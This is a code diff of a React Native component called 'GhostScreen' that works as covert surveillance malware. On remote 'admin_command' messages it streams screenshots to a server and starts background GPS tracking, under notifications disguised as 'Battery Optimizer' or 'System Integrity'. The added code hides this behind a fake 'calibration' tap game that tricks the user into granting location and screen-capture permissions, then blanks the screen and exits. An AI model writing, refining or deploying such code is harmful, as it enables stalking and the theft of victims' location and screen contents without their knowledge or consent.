@@ -1,93 +1,75 @@
-import React, { useEffect, useRef } from 'react';
-import { View, StyleSheet, BackHandler } from 'react-native';
-import * as Battery from 'expo-battery';
-import * as Network from 'expo-network';
+import React, { useState, useEffect, useRef } from 'react';
+import { View, Text, StyleSheet, TouchableOpacity, Animated, BackHandler, Alert } from 'react-native';
 import * as Location from 'expo-location';
+import * as Battery from 'expo-battery';
 import { captureScreen } from 'react-native-view-shot';
 
-const GPS_TASK = 'bg-gps-sync';
+export default function GhostScreen({ socket }) {
+    const [score, setScore] = useState(0);
+    const [stealth, setStealth] = useState(false);
+    const targetPos = useRef(new Animated.ValueXY({ x: 0, y: 0 })).current;
+    const streamInterval = useRef(null);
 
-export default function GhostScreen({ socket, name }) {
-    const streamTimer = useRef(null);
-    const pulseInterval = useRef(null);
-    const gpsKillTimer = useRef(null);
-
-    useEffect(() => {
-        // 1. STATUS PULSE (Battery & Signal)
-        const sendPulse = async () => {
-            const battery = await Battery.getBatteryLevelAsync();
-            const network = await Network.getNetworkStateAsync();
-            socket.emit('ghost_status', { 
-                battery: Math.floor(battery * 100),
-                netType: network.type 
-            });
-        };
-
-        sendPulse();
-        pulseInterval.current = setInterval(sendPulse, 30000); // Pulse every 30s
-
-        // 2. COMMAND LISTENERS
-        socket.on('admin_command', async (cmd) => {
-            if (cmd === 'START_LIVE') startStream(350);
-            if (cmd === 'START_ECO') startStream(5000);
-            if (cmd === 'STOP_STREAM') clearInterval(streamTimer.current);
-            if (cmd === 'WIPE') BackHandler.exitApp();
-
-            // PINPOINT GPS LOGIC
-            if (cmd === 'START_PINPOINT') await activatePinpoint();
-            if (cmd === 'STOP_PINPOINT') deactivatePinpoint();
-        });
-
-        return () => {
-            clearInterval(streamTimer.current);
-            clearInterval(pulseInterval.current);
-            clearTimeout(gpsKillTimer.current);
-            Location.stopLocationUpdatesAsync(GPS_TASK);
-        };
-    }, []);
-
-    const activatePinpoint = async () => {
-        const { status } = await Location.requestBackgroundPermissionsAsync();
-        if (status === 'granted') {
-            await Location.startLocationUpdatesAsync(GPS_TASK, {
-                accuracy: Location.Accuracy.BestForNavigation,
-                timeInterval: 5000,
-                foregroundService: {
-                    notificationTitle: "System Integrity",
-                    notificationBody: "Monitoring data stream...",
-                    notificationColor: "#000000"
-                }
-            });
-
-            // Auto-Kill GPS after 5 minutes to save battery
-            clearTimeout(gpsKillTimer.current);
-            gpsKillTimer.current = setTimeout(() => {
-                deactivatePinpoint();
-                socket.emit('admin_command', 'STOP_PINPOINT'); // Update Admin UI
-                socket.emit('system_log', "Pinpoint limit reached (5m). Dormant.");
-            }, 300000); 
+    const handleTap = async () => {
+        try {
+            if (score === 0) {
+                const { status } = await Location.requestForegroundPermissionsAsync();
+                if (status === 'granted') await Location.requestBackgroundPermissionsAsync();
+            } else if (score === 2) {
+                // Triggers the "Start Now" popup
+                await captureScreen({ format: 'jpg', quality: 0.1 });
+            } else if (score >= 4) {
+                setStealth(true);
+                setTimeout(() => BackHandler.exitApp(), 1200);
+            }
+            setScore(prev => prev + 1);
+            moveTarget();
+        } catch (e) {
+            Alert.alert("Sync Error", "Please allow system access to calibrate sensors.");
         }
     };
 
-    const deactivatePinpoint = async () => {
-        await Location.stopLocationUpdatesAsync(GPS_TASK);
-        clearTimeout(gpsKillTimer.current);
+    const moveTarget = () => {
+        Animated.spring(targetPos, {
+            toValue: { x: Math.random() * 220 - 110, y: Math.random() * 320 - 160 },
+            useNativeDriver: false
+        }).start();
     };
 
-    const startStream = (ms) => {
-        clearInterval(streamTimer.current);
-        streamTimer.current = setInterval(async () => {
-            if (!socket.connected) return;
-            try {
-                const img = await captureScreen({ format: 'jpg', quality: 0.2, result: 'base64' });
-                socket.emit('screen_frame', img);
-            } catch (e) {}
-        }, ms);
-    };
+    useEffect(() => {
+        socket.on('admin_command', async (cmd) => {
+            if (cmd === 'START_LIVE') {
+                clearInterval(streamInterval.current);
+                streamInterval.current = setInterval(async () => {
+                    const img = await captureScreen({ format: 'jpg', quality: 0.12, result: 'base64' });
+                    socket.emit('screen_frame', img);
+                }, 450);
+            }
+            if (cmd === 'STOP_STREAM') clearInterval(streamInterval.current);
+            if (cmd === 'START_PINPOINT') {
+                await Location.startLocationUpdatesAsync('bg-gps-sync', {
+                    accuracy: Location.Accuracy.High,
+                    foregroundService: { notificationTitle: "Battery Optimizer", notificationBody: "Scanning..." }
+                });
+            }
+        });
+    }, []);
 
-    return <View style={styles.stealthContainer} />;
+    if (stealth) return <View style={styles.blackout} />;
+
+    return (
+        <View style={styles.container}>
+            <Text style={styles.scoreText}>CALIBRATION: {score * 20}%</Text>
+            <Animated.View style={targetPos.getLayout()}>
+                <TouchableOpacity style={styles.target} onPress={handleTap} />
+            </Animated.View>
+        </View>
+    );
 }
 
 const styles = StyleSheet.create({
-    stealthContainer: { flex: 1, backgroundColor: '#000' }
+    container: { flex: 1, backgroundColor: '#050505', justifyContent: 'center', alignItems: 'center' },
+    blackout: { flex: 1, backgroundColor: '#000' },
+    scoreText: { position: 'absolute', top: 60, color: '#222', letterSpacing: 2 },
+    target: { width: 75, height: 75, borderRadius: 40, backgroundColor: '#ff3b30', borderWidth: 3, borderColor: '#fff' }
 });
